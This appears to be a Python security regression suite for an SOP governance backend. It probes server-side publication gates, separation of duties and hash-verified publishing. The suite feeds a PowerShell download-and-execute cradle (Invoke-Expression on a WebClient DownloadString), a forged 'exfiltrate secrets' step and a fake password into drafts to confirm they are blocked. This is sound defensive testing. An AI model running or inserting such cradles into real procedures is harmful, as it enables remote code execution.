"""
Regression & Security Attack-Probe Suite for P1 Code Review Findings C3 & C4
============================================================================
Verifies:
- C3: All 6 publication gates (Secrets/Quarantine, Schema/Parity/Binding, Quote Traceability >= 90%,
  Line Completeness >= 80%, Zero Open Issues/AST Threats/Rule-vs-AI Conflicts, Explicit Human
  Classification Confirmation) are computed strictly on the server from stored job + draft state.
  Client-supplied gate fields, last_editor, reviewer, actor_type, and actor in request bodies are ignored.
- C4: /publish uses ONLY the stored approved draft (never request body canonical_sop), verifies
  the SHA-256 of the reviewed canonical JSON and draft OKF payload recorded at approval time, fails
  closed with 409 stale_approval on missing/corrupt/tampered drafts or legacy hashless approvals,
  preserves approved canonical metadata in dual export, and resets confirmation cleanly on edits.
"""

import copy
import glob
import json
import os
import subprocess
import sys
import tempfile
import unittest

BACKEND_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

from agents.a2_structuring.canonical_builder import build_canonical_sop_from_draft  # noqa: E402
from agents.a5_review.sod_policy import (  # noqa: E402
    compute_canonical_sha256,
    evaluate_draft_publication_gates,
)
from types import SimpleNamespace  # noqa: E402


class TestC3C4ServerGateUnitHelpers(unittest.TestCase):
    def test_canonical_sha256_is_order_independent_and_tamper_sensitive(self):
        a = {"sop_id": "SOP-1", "classification": {"level": "L2", "score": 60}, "steps": [{"n": 1, "action": "Check"}]}
        b = {"steps": [{"action": "Check", "n": 1}], "classification": {"score": 60, "level": "L2"}, "sop_id": "SOP-1"}
        self.assertEqual(compute_canonical_sha256(a), compute_canonical_sha256(b))

        tampered = copy.deepcopy(a)
        tampered["steps"][0]["action"] = "Check maliciously"
        self.assertNotEqual(compute_canonical_sha256(a), compute_canonical_sha256(tampered))

    def test_missing_or_incomplete_draft_fails_closed(self):
        job = SimpleNamespace(
            sop_id="SOP-MISS-1",
            tenant_id="tn_northwind",
            content_sha256="a" * 64,
            current_state="awaiting_review",
            incident=None,
            purged=False,
        )
        for bad_draft in (None, {}, {"draft": {}, "canonical_draft": {}}, {"draft": {"frontmatter": {}}, "canonical_draft": "not-a-dict"}):
            res = evaluate_draft_publication_gates(job, bad_draft, for_publish=False, body_confirmed_classification=True)
            self.assertFalse(res.passed)
            self.assertFalse(res.gates["gate_2_schema"]["passed"])
            self.assertFalse(evaluate_draft_publication_gates(job, bad_draft, for_publish=True).passed)

    def test_vlm_visual_inspection_quotes_recomputed_on_server(self):
        raw_text = "SOP VPN Connect\n1. Open portal"
        vlm_reports = [
            {
                "image_index": 12,
                "label": "Image 12",
                "confidence_score": 0.95,
                "confidence_level": "High",
                "anchor_line": 2,
                "report_text": (
                    "SCREEN / CONTEXT: Office PC Configuration Modal\n"
                    "UI ACTION: Click the 'Save' button to confirm PC configuration\n"
                    "CONFIDENCE SCORE: 0.95\n"
                ),
            }
        ]
        draft_obj = {
            "raw_text": raw_text,
            "vlm_reports": vlm_reports,
            "frontmatter": {
                "sop_id": "SOP-VLM-U1",
                "title": "SOP VPN Connect",
                "category": "network",
                "platform": "system",
                "description": "Open portal",
                "steps": [
                    {
                        "step_number": 1,
                        "step_type": "command",
                        "sop_step_description": "Open portal",
                        "command": "start https://vpn.example.com",
                        "source_quote": "1. Open portal",
                    },
                    {
                        "step_number": 2,
                        "step_type": "command",
                        "sop_step_description": "Save profile",
                        "command": "save-profile",
                        "source_quote": "Click the 'Save' button to confirm PC configuration",
                    },
                ],
            },
        }
        canon = build_canonical_sop_from_draft(draft_obj, raw_text=raw_text, tenant_id="tn_northwind", vlm_reports=vlm_reports)
        canon["source"]["file_sha256"] = "b" * 64
        job = SimpleNamespace(
            sop_id="SOP-VLM-U1",
            tenant_id="tn_northwind",
            content_sha256="b" * 64,
            current_state="awaiting_review",
            incident=None,
            purged=False,
        )
        res_dec = evaluate_draft_publication_gates(
            job,
            {"sop_id": "SOP-VLM-U1", "draft": draft_obj, "canonical_draft": canon},
            for_publish=False,
            body_confirmed_classification=True,
        )
        self.assertTrue(res_dec.passed, res_dec.failure_reasons)
        # Stripping vlm_reports makes Step 2 unverifiable against raw_text alone -> Gate 3 fails on recomputation
        draft_no_vlm = copy.deepcopy(draft_obj)
        draft_no_vlm["vlm_reports"] = []
        res_no_vlm = evaluate_draft_publication_gates(
            job,
            {"sop_id": "SOP-VLM-U1", "draft": draft_no_vlm, "canonical_draft": canon},
            for_publish=False,
            body_confirmed_classification=True,
        )
        self.assertFalse(res_no_vlm.passed)
        self.assertFalse(res_no_vlm.gates["gate_3_traceability"]["passed"])
        # Before approval stamps confirmed=True, for_publish=True must still fail Gate 6
        res_pub_unconfirmed = evaluate_draft_publication_gates(
            job,
            {"sop_id": "SOP-VLM-U1", "draft": draft_obj, "canonical_draft": canon},
            for_publish=True,
        )
        self.assertFalse(res_pub_unconfirmed.passed)
        self.assertFalse(res_pub_unconfirmed.gates["gate_6_classification"]["passed"])


_SUBPROCESS_DRIVER = r'''
import copy
import glob
import hashlib
import json
import os
import sys
from unittest.mock import patch
from starlette.testclient import TestClient

backend_dir = os.environ["ELONE_BACKEND_DIR"]
sys.path.insert(0, backend_dir)

import api.context as ctx
import api.routes_ingestion as routes_ingestion
import server
from agents.a2_structuring.canonical_builder import build_canonical_sop_from_draft
from agents.a5_review.sod_policy import compute_canonical_sha256
from auth.models import AuthPrincipal
from auth.tokens import create_access_token
from utils.security import verify_playbook_before_execution

client = TestClient(server.app)

def make_hdr(identity, roles, *, tenant_id="tn_northwind", clearance="L2", actor_type="human"):
    p = AuthPrincipal(
        sub=f"sub_{identity}",
        identity=identity,
        display_name=identity,
        roles=list(roles),
        tenant_id=tenant_id,
        clearance=clearance,
        actor_type=actor_type,
        agent_id=identity if actor_type == "agent" else None,
    )
    tok, _, _ = create_access_token(p, ttl_seconds=1800)
    return {"Authorization": f"Bearer {tok}"}

HDR_ALICE = make_hdr("alice@nw.example", ["process_owner"], clearance="L1")
HDR_BOB_L2 = make_hdr("bob@nw.example", ["process_owner"], clearance="L2")
HDR_SEC = make_hdr("sec@nw.example", ["security_reviewer"], clearance="L3")
HDR_DUAL = make_hdr("dual@nw.example", ["process_owner", "security_reviewer"], clearance="L3")
HDR_AGENT_L1 = make_hdr("agent_l1", ["agent"], clearance="L1", actor_type="agent")
HDR_AGENT_L2 = make_hdr("agent_l2", ["agent"], clearance="L2", actor_type="agent")

def upload_and_ingest(sop_id, filename, raw_text, draft_frontmatter, uploader_hdr=HDR_ALICE):
    up = client.post(
        "/api/uploads/upload",
        headers=uploader_hdr,
        files={"file": (filename, raw_text.encode("utf-8"), "text/plain")},
    )
    assert up.status_code == 200, up.text
    mock_draft = {
        "sop_id": sop_id,
        "is_executable": True,
        "confidence_score": 0.95,
        "confidence_level": "High",
        "raw_text": raw_text,
        "vlm_reports": [],
        "frontmatter": draft_frontmatter,
    }
    with patch.object(routes_ingestion.jit_converter, "plan_okf_from_raw", return_value=mock_draft):
        ing = client.post(
            "/api/uploads/ingest",
            headers=uploader_hdr,
            json={"filename": filename, "sop_id": sop_id},
        )
    assert ing.status_code == 200, ing.text
    return ing.json()

def load_draft_json(sop_id):
    p = os.path.join(ctx.DRAFTS_DIR, f"{sop_id}.draft.json")
    with open(p, "r", encoding="utf-8") as f:
        return p, json.load(f)

def write_draft_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def base_clean_doc(sop_id, title="Clean Endpoint Check", desc="Verifies clock safely.", cmd="Get-Date"):
    raw_text = f"Title: {title}\nPurpose: {desc}\nStep 1: Check host date cleanly\n"
    fm = {
        "sop_id": sop_id,
        "title": title,
        "category": "system",
        "platform": "system",
        "description": desc,
        "steps": [
            {
                "step_number": 1,
                "step_type": "command",
                "sop_step_description": "Check host date cleanly",
                "command": cmd,
                "shell": "powershell",
                "source_quote": "Step 1: Check host date cleanly",
            }
        ],
    }
    return raw_text, fm

# ---------------------------------------------------------------------------
# 1. C3 Gate 6: Fail-closed classification confirmation (omit/False/"yes")
# ---------------------------------------------------------------------------
raw_1, fm_1 = base_clean_doc("SOP-C3-G6")
ing_1 = upload_and_ingest("SOP-C3-G6", "c3_g6.txt", raw_1, fm_1)
task_1 = ing_1["task_id"]

for bad_body in (
    {"decision": "approve"},
    {"decision": "approve", "confirmed_classification": False},
    {"decision": "approve", "confirmed_classification": "true"},
):
    r = client.post(f"/api/governance/review-tasks/{task_1}/decision", headers=HDR_SEC, json=bad_body)
    assert r.status_code == 400 and r.json()["error_code"] == "gates_failed", r.text
    assert any("Gate 6 Failed" in x for x in r.json()["failures"]), r.json()

# ---------------------------------------------------------------------------
# 2. C3 Gates 1-5: Spoofed passing metrics in request body are completely ignored
# ---------------------------------------------------------------------------
FORGED_PASS_GATES = {
    "decision": "approve",
    "confirmed_classification": True,
    "secrets_count": 0,
    "is_quarantined": False,
    "schema_valid": True,
    "schema_errors_count": 0,
    "traceability_pct": 100.0,
    "completeness_pct": 100.0,
    "open_blocking_issues_count": 0,
    "rule_ai_conflict": False,
    "last_editor": "nobody@nw.example",
    "reviewer": "other@nw.example",
    "actor_type": "human",
}

def assert_gate_failure(sop_id, task_id, mutator_fn, expected_gate_prefix):
    dp, orig = load_draft_json(sop_id)
    mutated = copy.deepcopy(orig)
    mutator_fn(mutated)
    write_draft_json(dp, mutated)
    try:
        r = client.post(f"/api/governance/review-tasks/{task_id}/decision", headers=HDR_SEC, json=FORGED_PASS_GATES)
        assert r.status_code == 400 and r.json().get("error_code") == "gates_failed", f"{expected_gate_prefix}: {r.status_code} {r.text}"
        assert any(expected_gate_prefix in f for f in r.json().get("failures", [])), r.json()
    finally:
        write_draft_json(dp, orig)

# Gate 1a: live password injected into stored draft command (body claims secrets_count=0)
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["draft"]["frontmatter"]["steps"][0].update({"command": "password = \"SuperSecretPass123!\""}),
    "Gate 1 Failed",
)

# Gate 1b: quality.status == "Quarantined"
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["canonical_draft"]["quality"].update({"status": "Quarantined"}),
    "Gate 1 Failed",
)

# Gate 2a: non-continuous canonical steps (n=5) violates CanonicalSOPModel even with stored quality.schema_valid=True
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["canonical_draft"]["steps"][0].update({"n": 5}),
    "Gate 2 Failed",
)

# Gate 2b: cross-SOP mismatch inside canonical_draft
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["canonical_draft"].update({"sop_id": "SOP-OTHER"}),
    "Gate 2 Failed",
)

# Gate 2c: missing .draft.json on approve fails closed
dp_1, orig_1 = load_draft_json("SOP-C3-G6")
os.remove(dp_1)
r_missing_dec = client.post(f"/api/governance/review-tasks/{task_1}/decision", headers=HDR_SEC, json=FORGED_PASS_GATES)
assert r_missing_dec.status_code == 400 and r_missing_dec.json()["error_code"] == "gates_failed", r_missing_dec.text
write_draft_json(dp_1, orig_1)

# Gate 3: unverified quote in draft fails server recomputation EVEN when stored quality.traceability=100
def mutate_unverified_quote(d):
    d["canonical_draft"]["steps"][0]["quote"] = "Hallucinated text never appearing in source"
    d["canonical_draft"]["quality"]["traceability"] = 100.0
assert_gate_failure("SOP-C3-G6", task_1, mutate_unverified_quote, "Gate 3 Failed")

# Gate 4: unmapped source lines in draft.raw_text drop completeness below 80% even when stored completeness=100
def mutate_low_completeness(d):
    extra = "\n".join(
        f"{idx}. Provision database replica cluster failover firewall routing audit"
        for idx in range(2, 16)
    )
    d["draft"]["raw_text"] = d["draft"]["raw_text"] + "\n" + extra
    d["canonical_draft"]["quality"]["completeness"] = 100.0
assert_gate_failure("SOP-C3-G6", task_1, mutate_low_completeness, "Gate 4 Failed")

# Gate 5a: open blocking issue in canonical_draft.issues (even with quality.blocking_issues_count=0)
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["canonical_draft"]["issues"].append({"id": "ISS-1", "type": "missing_step", "severity": "high", "detail": "Missing verify", "agent": "A4", "status": "open"}),
    "Gate 5 Failed",
)

# Gate 5b: dangerous AST command in canonical/draft step fails Gate 5 live scan
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["draft"]["frontmatter"]["steps"][0].update({"command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')"}),
    "Gate 5 Failed",
)

# Gate 5c: rule_ai_conflict on stored classification blocks approval even with forged rule_ai_conflict=False
assert_gate_failure(
    "SOP-C3-G6",
    task_1,
    lambda d: d["canonical_draft"]["classification"].update({"rule_level": "L1", "ai_suggested_level": "L2", "conflict": True}),
    "Gate 5 Failed",
)

# ---------------------------------------------------------------------------
# 3. C3: Forged last_editor in body is ignored; server draft + history fallback enforce SoD
# ---------------------------------------------------------------------------
r_edit_dual = client.put(
    "/api/governance/drafts/SOP-C3-G6/steps",
    headers=HDR_DUAL,
    json={"steps": [{"ref": 1, "sop_step_description": "Check host date cleanly", "command": "Get-Date", "source_quote": "Step 1: Check host date cleanly"}]},
)
assert r_edit_dual.status_code == 200, r_edit_dual.text

# Even spoofing last_editor='other' in body fails 403 SoD
r_sod_1 = client.post(
    f"/api/governance/review-tasks/{task_1}/decision",
    headers=HDR_DUAL,
    json={**FORGED_PASS_GATES, "last_editor": "someone_else@nw.example"},
)
assert r_sod_1.status_code == 403 and r_sod_1.json()["error_code"] == "separation_of_duties", r_sod_1.text

# Even if draft.last_editor & canonical lifecycle.last_editor were missing, job.history fallback still blocks dual@nw.example
dp_1, d_no_ed = load_draft_json("SOP-C3-G6")
d_no_ed_copy = copy.deepcopy(d_no_ed)
d_no_ed_copy.pop("last_editor", None)
d_no_ed_copy["canonical_draft"]["lifecycle"].pop("last_editor", None)
write_draft_json(dp_1, d_no_ed_copy)
r_sod_hist = client.post(
    f"/api/governance/review-tasks/{task_1}/decision",
    headers=HDR_DUAL,
    json={**FORGED_PASS_GATES, "last_editor": "someone_else@nw.example"},
)
assert r_sod_hist.status_code == 403 and r_sod_hist.json()["error_code"] == "separation_of_duties", r_sod_hist.text
write_draft_json(dp_1, d_no_ed)

# Independent security reviewer approves cleanly now
r_app_1 = client.post(
    f"/api/governance/review-tasks/{task_1}/decision",
    headers=HDR_SEC,
    json={"decision": "approve", "confirmed_classification": True, "reviewer": "forged@nw.example"},
)
assert r_app_1.status_code == 200, r_app_1.text
assert r_app_1.json()["reviewer"] == "sec@nw.example"
assert r_app_1.json()["canonical_sha256"]

# ---------------------------------------------------------------------------
# 4. C4: /publish ignores forged body canonical_sop, enforces stored tier, publishes ONLY stored draft
# ---------------------------------------------------------------------------
raw_l2 = (
    "Strictly Confidential Vault Rotation SOP\n"
    "Hosts: 10.10.1.1, 10.10.1.2, 192.168.10.5, vpn.northwind.corp\n"
    "Purpose: Rotates vault secret token ABC-XYZ cleanly\n"
    "Step 1: Rotate vault secret token cleanly\n"
)
fm_l2 = {
    "sop_id": "SOP-C4-BODY",
    "title": "Strictly Confidential Vault Rotation",
    "category": "security",
    "platform": "system",
    "description": "Rotates vault secret token ABC-XYZ cleanly",
    "steps": [
        {
            "step_number": 1,
            "step_type": "command",
            "sop_step_description": "Rotate vault secret token cleanly",
            "command": "Get-Date",
            "shell": "powershell",
            "source_quote": "Step 1: Rotate vault secret token cleanly",
        }
    ],
}
# Ensure L2 tier via dlp email count >= 5 if needed, or verify L2 classification on ingest
with patch.object(
    routes_ingestion.jit_converter,
    "plan_okf_from_raw",
    return_value={"sop_id": "SOP-C4-BODY", "is_executable": True, "raw_text": raw_l2, "vlm_reports": [], "frontmatter": fm_l2},
):
    client.post("/api/uploads/upload", headers=HDR_ALICE, files={"file": ("c4_body.txt", raw_l2.encode("utf-8"), "text/plain")})
    ing_l2 = client.post("/api/uploads/ingest", headers=HDR_ALICE, json={"filename": "c4_body.txt", "sop_id": "SOP-C4-BODY"}).json()

task_l2 = ing_l2["task_id"]
# Guarantee stored draft tier is L2 before approval
dp_l2, d_l2 = load_draft_json("SOP-C4-BODY")
d_l2["canonical_draft"]["classification"]["level"] = "L2"
d_l2["canonical_draft"]["classification"]["score"] = 60
write_draft_json(dp_l2, d_l2)

r_app_l2 = client.post(
    f"/api/governance/review-tasks/{task_l2}/decision",
    headers=HDR_SEC,
    json={"decision": "approve", "confirmed_classification": True},
)
assert r_app_l2.status_code == 200, r_app_l2.text
approved_hash_l2 = r_app_l2.json()["canonical_sha256"]
assert approved_hash_l2

forged_pub_body = {
    "actor": "spoofed_publisher@nw.example",
    "traceability_pct": 100.0,
    "completeness_pct": 100.0,
    "canonical_sop": {
        "schema_version": "1.0",
        "sop_id": "SOP-C4-BODY",
        "title": "HIJACKED_UNAPPROVED_TITLE",
        "tenant_id": "tn_globex",
        "classification": {"level": "L0", "score": 5},
        "purpose": {"text": "hijacked_unique_token_999"},
        "steps": [{"n": 1, "action": "Exfiltrate secrets", "input": "Invoke-WebRequest evil", "quote": "evil"}],
    },
}

# L1 PO cannot bypass L2 clearance using forged classification.level="L0" in /publish body
r_clr_block = client.post("/api/governance/sops/SOP-C4-BODY/publish", headers=HDR_ALICE, json=forged_pub_body)
assert r_clr_block.status_code == 403 and r_clr_block.json()["error_code"] == "insufficient_clearance", r_clr_block.text

# L2 PO publishes -> body canonical_sop & actor & gates completely ignored
r_pub_l2 = client.post("/api/governance/sops/SOP-C4-BODY/publish", headers=HDR_BOB_L2, json=forged_pub_body)
assert r_pub_l2.status_code == 200, r_pub_l2.text
pub_data = r_pub_l2.json()
assert pub_data["canonical_sha256"] == approved_hash_l2
md_l2 = pub_data["playbook_path"]
canon_l2_path = os.path.join(os.path.dirname(md_l2), "SOP-C4-BODY.canonical.json")
assert os.path.exists(md_l2) and os.path.exists(canon_l2_path)
assert not os.path.exists(dp_l2), "Staged draft should be purged after publish"

hmac_ok, hmac_err, _ = verify_playbook_before_execution(md_l2)
assert hmac_ok, hmac_err

with open(canon_l2_path, "r", encoding="utf-8") as cf:
    pub_canon = json.load(cf)
assert pub_canon["title"] == "Strictly Confidential Vault Rotation"
assert pub_canon["tenant_id"] == "tn_northwind"
assert pub_canon["classification"]["level"] == "L2"
assert pub_canon["classification"]["confirmed"] is True
assert pub_canon["classification"]["confirmed_by"] == "sec@nw.example"
assert pub_canon["lifecycle"]["state"] == "published"
assert pub_canon["lifecycle"]["published_by"] == "bob@nw.example"
assert len(pub_canon["lifecycle"]["approvals"]) == 1
assert "HIJACKED_UNAPPROVED_TITLE" not in json.dumps(pub_canon)

# Downstream search honors stored draft content and L2 tier (not hijacked query terms)
r_srch_hijack = client.post("/api/governance/downstream/search", headers=HDR_AGENT_L2, json={"query": "hijacked_unique_token_999"})
assert "SOP-C4-BODY" not in {x["sop_id"] for x in r_srch_hijack.json()["results"]}
r_srch_l1 = client.post("/api/governance/downstream/search", headers=HDR_AGENT_L1, json={"query": "ABC-XYZ"})
assert "SOP-C4-BODY" not in {x["sop_id"] for x in r_srch_l1.json()["results"]}
r_srch_l2 = client.post("/api/governance/downstream/search", headers=HDR_AGENT_L2, json={"query": "ABC-XYZ"})
assert "SOP-C4-BODY" in {x["sop_id"] for x in r_srch_l2.json()["results"]}

# ---------------------------------------------------------------------------
# 5. C4: Post-approval tampering, missing draft, or legacy hashless approval -> 409 stale_approval
# ---------------------------------------------------------------------------
# 5a. Tamper canonical_draft after approval
raw_t1, fm_t1 = base_clean_doc("SOP-C4-TAMP1", title="Tamper Canon Test")
ing_t1 = upload_and_ingest("SOP-C4-TAMP1", "tamp1.txt", raw_t1, fm_t1)
assert client.post(f"/api/governance/review-tasks/{ing_t1['task_id']}/decision", headers=HDR_SEC, json={"decision": "approve", "confirmed_classification": True}).status_code == 200
dp_t1, d_t1 = load_draft_json("SOP-C4-TAMP1")
d_t1["canonical_draft"]["steps"][0]["action"] = "Tampered post-approval action"
write_draft_json(dp_t1, d_t1)
r_t1 = client.post("/api/governance/sops/SOP-C4-TAMP1/publish", headers=HDR_BOB_L2, json={})
assert r_t1.status_code == 409 and r_t1.json()["error_code"] == "stale_approval", r_t1.text
assert not glob.glob(os.path.join(ctx.SOPS_DIR, "**", "SOP-C4-TAMP1.*"), recursive=True)
assert server.governance_ledger.get_job(ing_t1["job_id"]).current_state == "approved"

# 5b. Tamper draft OKF frontmatter after approval (canonical_draft untouched!)
raw_t2, fm_t2 = base_clean_doc("SOP-C4-TAMP2", title="Tamper Draft Test")
ing_t2 = upload_and_ingest("SOP-C4-TAMP2", "tamp2.txt", raw_t2, fm_t2)
assert client.post(f"/api/governance/review-tasks/{ing_t2['task_id']}/decision", headers=HDR_SEC, json={"decision": "approve", "confirmed_classification": True}).status_code == 200
dp_t2, d_t2 = load_draft_json("SOP-C4-TAMP2")
d_t2["draft"]["frontmatter"]["steps"][0]["command"] = "Write-Host tampered"
write_draft_json(dp_t2, d_t2)
r_t2 = client.post("/api/governance/sops/SOP-C4-TAMP2/publish", headers=HDR_BOB_L2, json={})
assert r_t2.status_code == 409 and r_t2.json()["error_code"] == "stale_approval", r_t2.text
assert not glob.glob(os.path.join(ctx.SOPS_DIR, "**", "SOP-C4-TAMP2.*"), recursive=True)

# 5c. Missing .draft.json at publish time
raw_m, fm_m = base_clean_doc("SOP-C4-MISS", title="Missing Draft Publish Test")
ing_m = upload_and_ingest("SOP-C4-MISS", "miss_pub.txt", raw_m, fm_m)
assert client.post(f"/api/governance/review-tasks/{ing_m['task_id']}/decision", headers=HDR_SEC, json={"decision": "approve", "confirmed_classification": True}).status_code == 200
dp_m, _ = load_draft_json("SOP-C4-MISS")
os.remove(dp_m)
r_miss = client.post("/api/governance/sops/SOP-C4-MISS/publish", headers=HDR_BOB_L2, json={})
assert r_miss.status_code == 409 and r_miss.json()["error_code"] == "stale_approval", r_miss.text

# 5d. Legacy approval decision missing canonical_sha256 -> 409 stale_approval
raw_leg, fm_leg = base_clean_doc("SOP-C4-LEG", title="Legacy Approval Hash Test")
ing_leg = upload_and_ingest("SOP-C4-LEG", "leg_pub.txt", raw_leg, fm_leg)
assert client.post(f"/api/governance/review-tasks/{ing_leg['task_id']}/decision", headers=HDR_SEC, json={"decision": "approve", "confirmed_classification": True}).status_code == 200
server.governance_ledger.get_job(ing_leg["job_id"]).approval_decision.pop("canonical_sha256", None)
r_leg = client.post("/api/governance/sops/SOP-C4-LEG/publish", headers=HDR_BOB_L2, json={})
assert r_leg.status_code == 409 and r_leg.json()["error_code"] == "stale_approval", r_leg.text

# 5e. Unapproved job returns 400 not_approved (not 409) even without touching draft
raw_na, fm_na = base_clean_doc("SOP-C4-NA", title="Not Approved Yet")
upload_and_ingest("SOP-C4-NA", "not_app.txt", raw_na, fm_na)
r_na = client.post("/api/governance/sops/SOP-C4-NA/publish", headers=HDR_BOB_L2, json={})
assert r_na.status_code == 400 and r_na.json()["error_code"] == "not_approved", r_na.text

# ---------------------------------------------------------------------------
# 6. Revision round-trip: changes_requested -> edit (resets confirmed) -> resubmit -> approve -> publish
# ---------------------------------------------------------------------------
raw_rev, fm_rev = base_clean_doc("SOP-C4-REV", title="Revision Hash Recalc Test")
ing_rev = upload_and_ingest("SOP-C4-REV", "rev_flow.txt", raw_rev, fm_rev)
task_rev_1 = ing_rev["task_id"]

assert client.post(
    f"/api/governance/review-tasks/{task_rev_1}/decision",
    headers=HDR_SEC,
    json={"decision": "changes_requested", "notes": "Clarify date command flag"},
).status_code == 200

# Verify schema error on canonical edit leaves draft intact (422)
r_bad_can = client.put(
    "/api/governance/drafts/SOP-C4-REV/canonical",
    headers=HDR_BOB_L2,
    json={"canonical": {**load_draft_json("SOP-C4-REV")[1]["canonical_draft"], "steps": []}},
)
assert r_bad_can.status_code == 422, r_bad_can.text

# Valid edit by Bob resets classification.confirmed -> False
r_ed_rev = client.put(
    "/api/governance/drafts/SOP-C4-REV/steps",
    headers=HDR_BOB_L2,
    json={
        "steps": [
            {
                "ref": 1,
                "sop_step_description": "Check host date cleanly (revised)",
                "command": "Get-Date -Format o",
                "source_quote": "Step 1: Check host date cleanly",
            }
        ]
    },
)
assert r_ed_rev.status_code == 200, r_ed_rev.text
assert r_ed_rev.json()["canonical_draft"]["classification"]["confirmed"] is False

r_resub = client.post("/api/governance/drafts/SOP-C4-REV/resubmit", headers=HDR_BOB_L2, json={"notes": "Fixed command format"})
assert r_resub.status_code == 200
task_rev_2 = r_resub.json()["task_id"]

r_app_rev = client.post(
    f"/api/governance/review-tasks/{task_rev_2}/decision",
    headers=HDR_SEC,
    json={"decision": "approve", "confirmed_classification": True},
)
assert r_app_rev.status_code == 200, r_app_rev.text
rev_hash = r_app_rev.json()["canonical_sha256"]

# Draft cannot be edited once approved
assert client.put(
    "/api/governance/drafts/SOP-C4-REV/steps",
    headers=HDR_BOB_L2,
    json={"steps": [{"ref": 1, "sop_step_description": "tamper", "command": "Get-Date"}]},
).status_code == 409

r_pub_rev = client.post("/api/governance/sops/SOP-C4-REV/publish", headers=HDR_BOB_L2, json={})
assert r_pub_rev.status_code == 200, r_pub_rev.text
assert r_pub_rev.json()["canonical_sha256"] == rev_hash
with open(r_pub_rev.json()["playbook_path"], "r", encoding="utf-8") as mf:
    assert "Get-Date -Format o" in mf.read()

print("ALL_C3_C4_ATTACK_PROBES_PASSED")
'''


class TestC3C4ApiAttackProbes(unittest.TestCase):
    def test_c3_c4_server_gates_and_publish_integrity(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            driver_path = os.path.join(tmpdir, "run_c3_c4_probes.py")
            with open(driver_path, "w", encoding="utf-8") as f:
                f.write(_SUBPROCESS_DRIVER)

            env = dict(os.environ)
            env["ELONE_KB_DIR"] = tmpdir
            env["ELONE_BACKEND_DIR"] = BACKEND_DIR
            env["ELONE_ALLOW_INSECURE_DEV_KEY"] = "1"
            env["ELONE_JWT_SECRET"] = "test-c3-c4-isolated-secret-0123456789"
            env["ELONE_AUTH_MODE"] = "local"

            proc = subprocess.run(
                [sys.executable, driver_path],
                capture_output=True,
                text=True,
                env=env,
                timeout=90,
            )
            self.assertEqual(
                proc.returncode,
                0,
                f"C3/C4 attack-probe test failed (exit {proc.returncode}):\nSTDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}",
            )
            self.assertIn("ALL_C3_C4_ATTACK_PROBES_PASSED", proc.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
